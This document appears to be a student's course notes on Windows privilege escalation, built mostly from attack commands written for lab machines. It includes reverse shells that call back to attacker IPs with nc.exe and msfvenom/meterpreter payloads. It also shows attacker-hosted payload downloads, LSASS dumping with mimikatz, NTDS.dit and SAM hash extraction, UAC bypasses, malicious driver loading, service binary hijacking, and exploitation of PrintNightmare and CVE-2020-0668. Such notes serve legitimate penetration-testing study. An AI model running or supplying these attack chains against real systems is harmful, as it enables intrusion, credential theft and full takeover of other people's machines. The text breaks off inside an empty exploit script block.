# Windows Privilege Escalation

1. [Lay of the Land](#lay-of-the-land)
1. [Windows User Privileges](#windows-user-privileges)
1. [Windows Group Privileges](#windows-group-privileges)
1. [Attacking the OS](#attacking-the-os)
1. [Credential Theft](#credential-theft)
1. [Restricted Environments](#restricted-environments)
1. [Additional Techniques](#additional-techniques)
1. [End of Life Systems](#end-of-life-systems)
1. [Skills Assessment](#skills-assessment)

## Lay of the Land

* Situational awareness:

    ```cmd
    ipconfig /all
    # view IPs, interface info, DNS info

    arp -a
    # ARP table

    route print
    # routing table
    ```

    ```ps
    Get-MpComputerStatus
    # check Window Defender status

    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    # list AppLocker rules

    Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
    # test AppLocker policy
    ```

* Initial enumeration:

    * [Windows commands reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands) and [Windows privesc cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/) for manual enumeration

    ```cmd
    tasklist /svc
    # running processes

    set
    # view environment variables like PATH

    systeminfo
    # view system info, config info
    # check for hotfixes

    wmic qfe
    # check for patches, updates with QFE

    wmic product get name
    # display installed software

    netstat -ano
    # display active TCP and UDP connections
    # for checking services and ports

    query user
    # view logged-in users

    echo %username%
    # view current user

    whoami /priv
    # current user privileges
    # we may get a different output if 'cmd' is opened as Administrator

    whoami /groups
    # current user group info, check for group privileges

    net user
    # all user accounts

    net localgroup
    # all groups

    net localgroup administrators
    # details about a group

    net accounts
    # get password policy and other account info
    ```

    ```ps
    Get-HotFix | ft -AutoSize
    # check for patches and updates

    Get-WmiObject -Class Win32_Product |  select Name, Version
    # display installed software
    ```

* Communication with processes:

    ```cmd
    netstat -ano
    # display active network connections
    # check for entries listening on loopback addresses - 127.0.0.1 and ::1,
    # that are not listening on the IP itself or broadcast adresses - 0.0.0.0 and ::/0

    # pipes - used for communication between apps or processes using shared memory
    # can be named pipes or anonymous pipes

    pipelist.exe /accepteula
    # list named pipes with pipelist from sysinternals suite

    # we can use accesschk to enumerate permissions

    accesschk.exe /accepteula \\.\Pipe\lsass -v
    # reviewing lsass named pipe permissions
    # check if any user has FILE_ALL_ACCESS - all possible access rights
    
    # pipe name, syntax, path is important

    accesschk.exe -w \pipe\* -v
    # search for all named pipes that allow write access
    ```

    ```ps
    gci \\.\pipe\
    # list named pipes
    ```

## Windows User Privileges

* Windows privileges:

    * Groups with rights & privileges:

        * Default Administrators
        * Server Operators
        * Backup Operators
        * Print Operators
        * Hyper-V Administrators
        * Account Operators
        * Remote Desktop Users
        * Remote Management Users
        * Group Policy Creator Owners
        * Schema Admins
        * DNS Admins
    
    * User Rights (can depend on assigned group membership) - can be listed using ```whoami /priv```:

        ```md
        | **Privilege Name**            | **Description**                              | **Standard Assignment**                                 |
        |-------------------------------|----------------------------------------------|---------------------------------------------------------|
        | SeNetworkLogonRight           | Access this computer from the network        | Administrators, Authenticated Users                     |
        | SeRemoteInteractiveLogonRight | Allow log on through Remote Desktop Services | Administrators, Remote Desktop Users                    |
        | SeBackupPrivilege             | Backup files and directories                 | Administrators                                          |
        | SeSecurityPrivilege           | Manage auditing and security log             | Administrators                                          |
        | SeTakeOwnershipPrivilege      | Take ownership of files or other objects     | Administrators                                          |
        | SeDebugPrivilege              | Debug programs                               | Administrators                                          |
        | SeImpersonatePrivilege        | Impersonate a client after authentication    | Administrators, Local Service, Network Service, Service |
        | SeLoadDriverPrivilege         | Load and unload device drivers               | Administrators                                          |
        | SeRestorePrivilege            | Restore files and directories                | Administrators                                          |
        ```
    
    * Even if a privilege is listed as 'Disabled' for our account, it means it has the specific privilege assigned; we can enable privileges using [certain](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) [scripts](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)

* SeImpersonate and SeAssignPrimaryToken:

    * JuicyPotato exploit:

        ```sh
        # on attacker machine
        # suppose we have gained a foothold on a SQL server using a privileged SQL user
        # we can connect to the SQL server instance and confirm privileges
        mssqlclient.py sql_dev@10.129.43.30 -windows-auth

        enable_xp_cmdshell
        # in the MSSQL shell, enable xp_cmdshell

        xp_cmdshell whoami
        # shows SQL server service account

        xp_cmdshell whoami /priv
        # SeImpersonatePrivilege listed
        # JuicyPotato exploit can be used for privesc

        # upload JuicyPotato.exe and nc.exe to target server
        # for example
        xp_cmdshell "powershell.exe wget http://10.10.14.2:8000/nc.exe -OutFile c:\tools\nc.exe"

        # setup listener on attacker
        nc -nvlp 8443

        # in MSSQL shell
        xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
        # -l is COM server listening port, on which it listens for incoming connections
        # -p is program to launch
        # -t is createprocess call

        # we get reverse shell as SYSTEM on our listener
        ```
    
    * PrintSpoofer and RoguePotato exploit:

        ```sh
        # JuicyPotato does not work on Windows Server 2019 and Windows 10 build 1809 onwards
        # we can use other exploits like PrintSpoofer and RoguePotato

        # in MSSQL shell, after enable_xp_cmdshell
        # we can leverage the same privileges for PrintSpoofer exploit
        xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
        
        # we get reverse shell as SYSTEM on our listener at port 8443
        ```

* SeDebugPrivilege:

    ```sh
    # suppose we have foothold of a Developer user
    # open an elevated shell to check
    whoami /priv
    # SeDebugPrivilege listed - not necessarily enabled

    # to search for procdump.exe in C:
    dir C:\procdump.exe /s /p
    # cd to this directory

    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    # use ProcDump from SysInternals suite to use this privilege and dump process memory
    # LSASS process stores user creds so we can start with that

    mimikatz.exe
    
    # in mimikatz shell
    log
    # to log all command output in a .txt file, useful for saving huge data

    sekurlsa::minidump lsass.dmp
    # load the procdump output
    # make sure the dmp file is in the same directory

    sekurlsa::logonpasswords
    # fetch NTLM hashes from dump

    # if we cannot load tools on target but we have RDP
    # we can take manual memory dump from Task Manager > Details > choose lsass.exe process
    # right click and create dump file
    ```

    ```ps
    # we can leverage SeDebugPrivilege for RCE too

    # on attacker
    wget https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1

    # transfer this script to target machine

    # open an elevated PS shell - run as admin

    tasklist
    # shows running process and PID
    # winlogon.exe, for example, runs as SYSTEM - we can choose this

    # run the exploit script in reqd format
    . .\psgetsys.ps1

    ImpersonateFromParentPid -ppid 612 -command "C:\Windows\System32\cmd.exe" -cmdargs ""
    # for the -cmdargs parameter we can add whatever command should be executed in cmd

    # we can also use Get-Process cmdlet to fetch PID of a well-known process running as SYSTEM - like lsass

    # we can also check resources like "https://github.com/daem0nc0re/PrivFu"
    # for PoC scripts to exploit privileges
    ```

* SeTakeOwnershipPrivilege:

    ```ps
    whoami /priv
    # SeTakeOwnershipPrivilege is listed, but disabled
    # viewed in elevated PS console

    # we can use a PS script to enable all privileges
    # like - https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
    # and - https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1

    Import-Module .\Enable-Privilege.ps1

    .\EnableAllTokenPrivs.ps1
    
    whoami /priv
    # now it is enabled

    # now, choose a target file - it could be credentials or SSH keys

    # inspect the file
    Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

    # file owner is not shown, so we do not have enough permissions over the object

    cmd /c dir /q 'C:\Department Shares\Private\IT'
    # check owner of the parent directory
    # this is owned by a service account 'sccm_svc'

    # using privilege, take ownership of file
    takeown /f 'C:\Department Shares\Private\IT\cred.txt'

    # confirm ownership has changed with same command - we can see owner now
    Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

    # modify ACL if we are still unable to read it

    icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
    # grant full priv using icacls

    # now we can read the file
    ```

## Windows Group Privileges

* Windows Built-in Groups:

    * Windows servers have a lot of built-in groups - many of these provide special privileges to their members

    * [List of all built-in groups](https://ss64.com/nt/syntax-security_groups.html) and [list of all privileged accounts & groups in AD](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) for reference

* Backup Operators:

    ```ps
    whoami /groups
    # we are part of Backup Operators group

    # this grants us SeBackup and SeRestore privs
    whoami /priv

    # to exploit SeBackupPrivilege, we can use the DLLs from this repo
    # 'https://github.com/giuliano108/SeBackupPrivilege'

    # import the libraries
    Import-Module .\SeBackupPrivilegeUtils.dll

    Import-Module .\SeBackupPrivilegeCmdLets.dll

    whoami /priv
    # confirm if SeBackupPrivilege is enabled or not
    # we can also check it with this cmdlet
    Get-SeBackupPrivilege

    # if it is disabled, enable it with this cmdlet
    Set-SeBackupPrivilege
    
    whoami /priv
    # SeBackupPrivilege is enabled now

    # we can choose a protected file and copy it
    dir C:\Confidential

    Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

    # once copied, we can view the file
    cat .\Contract.txt

    # in an AD env, Backup Operators group can log into a DC
    # we can copy NTDS.dit, locked by default, using Windows diskshadow tool
    
    # create a shadow copy of C drive and expose as E drive
    diskshadow.exe

    set verbose on
    set metadata C:\Windows\Temp\meta.cab
    set context clientaccessible
    set context persistent
    begin backup
    add volume C: alias cdrive
    create
    expose %cdrive% E:
    end backup
    exit

    dir E:
    # shadow copy of C drive

    # now, we can copy NTDS.dit locally
    Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
    
    # we can use inbuilt tools like robocopy to take backup of NTDS.dit, locally
    # in cmd
    robocopy /B E:\Windows\NTDS .\ntds ntds.dit

    # to extract creds from NTDS.dit, we can use secretsdump.py or PS DSInternals module

    # using DSInternals
    Import-Module .\DSInternals.psd1
    $key = Get-BootKey -SystemHivePath .\SYSTEM

    Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
    ```

    ```cmd
    # with SeBackupPrivilege, we can take backup of registry hives, which can be locally cracked
    reg save HKLM\SYSTEM SYSTEM.SAV

    reg save HKLM\SAM SAM.SAV
    ```

    ```sh
    # extracting hashes from NTDS.dit using secretsdump.py
    # on attacker
    secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
    ```

* Event Log Readers:

    ```sh
    net localgroup "Event Log Readers"
    # confirm group membership

    # passing creds to wevtutil
    wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
    ```

    ```ps
    # search security logs using wevtutil tool
    wevtutil qe Security /rd:true /f:text | Select-String "/user"

    # searching security logs using Get-WinEvent
    Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
    ```

* DnsAdmins:

    * [Leveraging DnsAdmins Access](https://adsecurity.org/?p=4064):

        ```sh
        # on attacker machine
        # generate malicious DLL
        msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

        # start HTTP server
        python3 -m http.server 7777
        ```

        ```ps
        # on target
        # download the DLL
        wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"

        # using dnscmd, we can load a custom DLL
        # but for it to work, we need to be a privileged user - member of DnsAdmins

        Get-ADGroupMember -Identity DnsAdmins
        # confirm our user 'netadm' is part of DnsAdmins
        ```

        ```cmd
        # now, load custom DLL using dnscmd - mention full path
        # ServerLevelPluginDll is the option by which DLL path is not verified
        dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

        # we need to check if we can restart the DNS service

        # find user SID
        wmic useraccount where name="netadm" get sid

        # check permissions on DNS service
        sc.exe sdshow DNS
        # from the security descriptors, this user SID has 'RPWP' permissions
        # RP - service start, WP - service stop

        # so, we can stop the DNS service
        sc stop dns

        # start the DNS service
        sc start dns
        # the service will show as failed to start correctly, as part of process

        # confirm group membership for 'netadm'
        net group "Domain Admins" /dom
        
        # in case we are getting access denied after getting Domain Admin too
        # logout/login required to force an update
        ```

        ```cmd
        # cleaning up

        # confirm the ServerLevelPluginDll registry key exists for the custom DLL
        reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

        # delete the reg key pointing to custom DLL
        reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

        # start DNS service again
        sc.exe start DNS

        sc query dns
        # it will show as running
        ```
    
    * [Using Mimilib.dll](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html):

        * We can use [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from ```mimikatz``` to gain command execution

        * We need to modify the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file and include the command to be executed (usually a reverse-shell one-liner)
    
    * Creating a WPAD record:

        * DnsAdmins members can disable global query block security, which blocks this attack - and by default WPAD (Web Proxy Automatic Discovery Protocol) and ISATAP (Intra-site Automatic Tunnel Addressing Protocol) are on the global query block list

        * If the machine has a WPAD record with default settings, it will have its traffic proxied through attacker machine; we can use tools like ```Responder``` or ```Inveigh``` to perform traffic spoofing and capture hashes

        ```ps
        # disable global query block list
        Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

        # add WPAD record
        Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
        # where 10.10.14.3 is the attacker IP
        ```

* Hyper-V Administrators:

    * If DCs (Domain Controller) have been virtualized, the virtualization admins can be considered Domain Admins; they can clone the live DC, mount the virtual disk offline and obtain the NTDS.dit file

    * [This blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) also shows a way to delete the VM, so that ```vmms.exe``` attempts to restore original file permissions on corresponding ```.vhdx``` file as ```NT AUTHORITY\SYSTEM``` - we can delete the ```.vhdx``` file and create a native hard link to point to a protected SYSTEM file - we will get full control to this

    * If OS is vulnerable to CVE-2018-0952 or CVE-2019-0841, we can use an app with service running as SYSTEM (and can be started by unprivileged users) to gain SYSTEM privileges

    ```cmd
    # we can use this PoC exploit script - 'https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1'
    # suppose the protected SYSTEM file is the Mozilla Maintenance Service for Firefox

    # we can execute the PS script as shown in the blog
    # then take ownership of the file we have gained control over
    takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

    # now we can replace this file with a malicious 'maintenanceservice.exe'
    # then start the service to get execution as SYSTEM
    sc.exe start MozillaMaintenance
    ```

* Print Operators:

    ```cmd
    whoami /groups
    # part of Print Operators
    # this grants us the SeLoadDriverPrivilege
    # it can be exploited in builds before Windows 10 version 1803

    whoami /priv
    # if we do not see SeLoadDriverPrivilege, we need to bypass UAC

    # we can use UACMe repo - https://github.com/hfiref0x/UACME - for bypassing UAC
    # 'Akagi64.exe' has multiple methods - we can use those
    # for example, to add new user - 'Akagi64.exe 61 "net user test pa55w0rd /add"'
    # or for revshell - 'Akagi64.exe 61 "C:\Tools\service.exe"'

    # alternatively, if we have GUI access, we can open an admin cmd shell
    # and input creds of member of Print Operators group

    # now we should have SeLoadDriverPrivilege listed but disabled
    whoami /priv

    # to enable SeLoadDriverPrivilege
    # we need to use this PoC script - https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp
    # but with a few libaries included at top
    ```

    ```c
    #include <windows.h>
    #include <assert.h>
    #include <winternl.h>
    #include <sddl.h>
    #include <stdio.h>
    #include "tchar.h"
    // these include statements should be present in PoC script
    // for enabling SeLoadDriverPrivilege

    // the driver Capcom.sys can be loaded with this privilege
    ```

    ```cmd
    # after making the changes to the script
    # from Visual Studio Developer command prompt, compile using cl.exe
    cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

    # then, download the required driver Capcom.sys - https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
    # and save to 'C:\Tools'

    # add references to driver
    reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
    reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
    # '\??\' is an NT Object path to reference the malicious driver
    ```
    
    ```ps
    # now, using the DriverView utility, confirm the driver is not loaded
    .\DriverView.exe /stext drivers.txt

    cat drivers.txt | Select-String -pattern Capcom
    ```

    ```cmd
    # verify privilege is enabled
    EnableSeLoadDriverPrivilege.exe
    # this output shows the privilege is enabled now
    ```
    
    ```ps
    # now, DriverView should list Capcom driver
    .\DriverView.exe /stext drivers.txt

    cat drivers.txt | Select-String -pattern Capcom

    # we can exploit this using the ExploitCapcom tool - https://github.com/tandasat/ExploitCapcom
    # after compiling it with VisualStudio

    .\ExploitCapcom.exe
    # this launches a shell as SYSTEM in GUI

    # if we do not have GUI access
    # we need to edit the ExploitCapcom.cpp code before compiling
    # and replace line 292 with a reverse shell binary created by msfvenom, for example
    # like this - TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
    # alternatively, we can use a add user payload
    ```

    ```cmd
    # to automate enabling SeLoadDriverPrivilege, and loading the driver
    # we can use tools like EoPLoadDriver - https://github.com/TarlogicSecurity/EoPLoadDriver/
    EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

    # after this we can run ExploitCapcom.exe
    ```

    ```cmd
    # for cleaning up, we can delete the registry key entry
    reg delete HKCU\System\CurrentControlSet\Capcom
    ```

* Server Operators:

    ```cmd
    # this group has SeBackupPrivilege and SeRestorePrivilege assigned
    # and the ability to control local services

    # query the AppReadiness service
    sc qc AppReadiness
    # this service starts as SYSTEM

    # check permissions on service
    # using PsService tool from Sysinternals suite - https://learn.microsoft.com/en-us/sysinternals/downloads/psservice
    c:\Tools\PsService.exe security AppReadiness
    # shows that Server Operators group has full control over this service
    # as seen from SERVICE_ALL_ACCESS right

    # check local admin group members
    net localgroup Administrators
    # our target account is not present

    # modify service binary path
    # to execute a command which adds our user to admin group
    sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

    # start the service
    sc start AppReadiness
    # this fails, as expected

    net localgroup Administrators
    # server_adm is now a part of this group
    # we have full control over DC
    ```

    ```sh
    # on attacker machine
    # for post-exploitation

    crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
    # where 10.129.43.9 is the domain controller IP

    # fetch NTLM password hashes from DC
    secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
    ```

## Attacking the OS

* User Account Control (UAC):

    ```sh
    whoami /user

    net localgroup administrators

    # current user is in admin group
    # but it is unprivileged due to UAC - only Administrator account can bypass UAC at default setting

    whoami /priv
    # only shows normal user rights and not admin rights

    # no CLI version of UAC consent prompt
    # so we need to bypass UAC for privesc

    # first, confirm if UAC is enabled
    REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

    # check UAC level
    REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
    # value of 'ConsentPromptBehaviorAdmin' is '0x5'
    # highest UAC level of 'Always notify' is enabled
    ```

    ```ps
    # UAC bypass methods vary in different builds
    # check Windows version
    [environment]::OSVersion.Version
    # build version 14393, cross-referenced with Windows version history, gives release 1607

    # check the UACME project - https://github.com/hfiref0x/UACME
    # it has a list of UAC bypasses with build number and technique to bypass UAC on that build

    # for example, technique no. 54 works from Windows 10 build 14393
    # this method uses 32-bit version of auto-elevating trusted binary SystemPropertiesAdvanced.exe
    # shown in this blog - https://egre55.github.io/system-properties-uac-bypass
    ```

    ```ps
    # review PATH var
    cmd /c echo %PATH%
    # this lists a writeable folder 'WindowsApps', as it is in current user's profile
    # we can use DLL hijacking with 'srrstr.dll' to bypass UAC
    ```

    ```sh
    # in attacker machine
    # generate a malicious DLL
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

    # setup server
    sudo python3 -m http.server 8080

    # also setup listener
    nc -nvlp 8443
    ```

    ```ps
    # on target, fetch the DLL
    curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

    # if we simply execute this DLL, we get a shell back with normal user rights - UAC enabled
    # 'rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll'
    # but for exploit, we need to execute 32-bit version of SystemPropertiesAdvanced.exe

    C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
    # this gives us a shell on our listener
    ```

    ```sh
    # on reverse shell
    whoami /priv
    # shows escalated, admin privs - UAC bypassed
    ```

* Weak Permissions:

    * Permissive file system ACLs:

        ```ps
        # we can use SharpUp - https://github.com/GhostPack/SharpUp/
        # to check for service binaries with weak ACLs
        .\SharpUp.exe audit

        # this identifies PC Security Management Service along with binary path

        # check permissions using icacls
        icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
        # 'Everyone' and 'BUILTIN\Users' groups have been granted full permissions to this dir
        # any user can manipulate this dir and its files
        ```

        ```cmd
        # this service is startable by unprivileged users
        # so we can take a backup of original binary and replace it with a malicious binary

        cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

        sc start SecurityService
        # malicious binary executed
        ```
    
    * Weak service permissions:

        ```cmd
        # check using SharpUp for any modifiable services
        SharpUp.exe audit
        # we see WindScribeService is potentially misconfigured

        # check permissions with AccessChk from Sysinternals
        accesschk.exe /accepteula -quvcw WindscribeService
        # -q - omit banner, -u - suppress errors, -v - verbose, -c - service name, -w - only show objects with write access

        # WindscribeService shows all authenticated users have 'SERVICE_ALL_ACCESS' rights - full r/w control

        net localgroup administrators
        # currently our user is not a member

        # change service binary path, to add user to admin group
        sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

        sc stop WindscribeService

        # start the service now so that the binpath command runs
        sc start WindscribeService
        # this will fail but the command would run

        net localgroup administrators
        # our user is part of this group now

        # this example also applies to Update Orchestrator Service (UsoSvc) for CVE-2019-1322

        # as part of cleanup, we can set binpath back to default
        sc config WindscribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
        ```
    
    * Unquoted service path:

        ```cmd
        # if a binary path is not in quotes
        # Windows will attempt to locate it in different folders

        sc query SystemExplorerHelpService
        # the binary path is unquoted - C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

        # Windows will start looking for the binary - space acts as delimiter
        # first in 'C:\Program', then in 'C:\Program Files', then in 'C:\Program Files (x86)\System' and so on

        # we need enough privileges to create file in the root of program files, and to restart the service itself

        # search for unquoted service paths
        wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
        ```
    
    * Permissive registry ACLs:

        ```cmd
        accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
        # check for weak service ACLs in registry
        
        # suppose this shows KEY_ALL_ACCESS for a certain entry 'HKLM\System\CurrentControlSet\services\ModelManagerService'
        ```

        ```ps
        # this can be abused using Set-ItemProperty to change ImagePath
        Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
        ```
    
    * Modifiable registry autorun binary:

        ```ps
        # check for programs running at system startup (autorun)
        # we can privesc if we have write permissions to the registry for any autorun binary or overwrite the binary

        Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
        ```

* Kernel exploits:

    * MS08-067:

        * RCE vulnerability in 'Server' service due to improper handling of RPC requests
        * affected Windows Server 2000, 2003, 2008, Windows XP & Vista
        * if SMB service is blocked via firewall, we can forward port 445 to attacker and escalate privs
    
    * MS17-010:

        * EternalBlue; RCE vulnerability in SMBv1 protocol
    
    * ALPC Task Scheduler 0-Day:

        * ALPC endpoint used by Windows Task Scheduler service can be used to write arbitrary DACLs to '.job' files in C:\Windows\tasks directory
        * [the exploit](https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html) uses ```SchRpcSetSecurity``` API function to call a print job using the XPS printer & hijack the DLL as SYSTEM via Spooler service
    
    * CVE-2021-36934 HiveNightmare (SeriousSam):

        * Windows 10 flaw that causes any user to have rights to read the Windows registry hives
        * offline copies of SAM, SYSTEM & SECURITY registry hives can be created, and password hashes can be extracted from them using tools like ```SecretsDump.py```

        ```cmd
        icacls c:\Windows\System32\config\SAM
        # check permissions on SAM file
        # readable by 'BUILTIN\Users' group
        ```

        ```ps
        # PoC exploit - https://github.com/GossiTheDog/HiveNightmare
        # also requires shadow copies - Windows 10 will have System Protection enabled by default, which uses this
        .\HiveNightmare.exe
        # creates offline copies of hives
        ```

        ```sh
        # transfer the hive copies to attacker machine and crack them
        impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
        ```
    
    * CVE-2021-1675/CVE-2021-34527 (PrintNightmare):

        * flaw in RpcAddPrinterDriver function, which provides the users with SeLoadDriverPrivilege
        * [the exploits](https://github.com/cube0x0/CVE-2021-1675) use this to execute a malicious DLL; [PS script](https://github.com/calebstewart/CVE-2021-1675) also available for LPE

        ```ps
        # check if Spooler service is running, which is required for this vulnerability
        ls \\localhost\pipe\spoolss
        # if it is not running, we get a 'path does not exist' error

        # bypass execution policy on target
        Set-ExecutionPolicy Bypass -Scope Process

        # use the PS exploit script

        Import-Module .\CVE-2021-1675.ps1

        Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

        # above exploit creates new user in Admin group
        net user hacker
        ```
    
    * CVE-2020-0668:

        * exploits arbitrary file move vulnerability in Service Tracing
        * we can use [this exploit for CVE-2020-0668](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) - this project needs to built in Visual Studio, and it will create the '.exe' file
        * we can leverage third-party software, such as the Mozilla Maintenance Service, which runs in the context of SYSTEM and is startable by unprivileged users

        ```cmd
        whoami /priv
        # current user privileges

        # check permissions on the Mozilla binary
        icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
        # here, 'BUILTIN\Users' have only RX - read & execute permissions
        ```

        ```sh
        # on attacker
        # generate a malicious revshell binary to replace the Mozilla one
        msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

        # host it
        python3 -m http.server 8000
        ```

        ```ps
        # on victim, fetch the binary
        # we will need 2 copies of the malicious file because the exploit corrupts it initially

        wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe

        wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
        ```

        ```cmd
        # run the exploit
        C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

        # now check permissions of new file
        icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
        # our user has full control over this binary
        # we can now overwrite it with a non-corrupted version, the second copy, of the malicious binary

        copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
        # replace the corrupted binary with the functional copy
        ```

        ```sh
        # in attacker machine
        # create a Metasploit Resource Script - used to automate tasks
        vim handler.rc

        # launch metasploit with resource script
        sudo msfconsole -r handler.rc
        ```

        ```rc
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/reverse_https
        set LHOST 10.10.14.3
        set LPORT 8443
        exploit
        ```

        ```cmd
        # on victim
        # start the service
        net start MozillaMaintenance
        # we get an error while starting the service
        # but we get a Meterpreter shell on attacker
        ```
    
    * Check installed updates and find any missing patches based on KB ID - this gives an idea of most recent updates on machine:

        ```ps
        systeminfo

        wmic qfe list brief
        # gives a list of installed updates

        Get-Hotfix
        ```

* Vulnerable services:

    ```cmd
    # check installed programs
    wmic product get name
    # shows 'Druva inSync 6.6.3'
    # searching on Google shows exploits - https://www.exploit-db.com/exploits/49211

    # check local ports
    netstat -ano | findstr 6064
    # Druva inSync listening on port 6064 with PID 3324
    ```

    ```ps
    # process details for PID 3324
    get-process -Id 3324
    # shows process name

    # confirm process using get-service cmdlet
    get-service | ? {$_.DisplayName -like 'Druva*'}
    ```

    ```sh
    # on attacker machine
    # use reverse shell script - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
    vim shell.ps1
    # modify last line to add this for revshell
    # Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443

    vim exploit.ps1
    # exploit code

    python3 -m http.server 8080

    # start listener
    nc -nvlp 9443
    ```

    ```ps
    # on target
    wget 'http://10.10.14.3:8080/exploit.ps1' -O exploit.ps1

    Set-ExecutionPolicy Bypass -Scope Process

    # run the exploit code
    .\exploit.ps1
    ```

    ```ps1
    $ErrorActionPreference = "Stop"
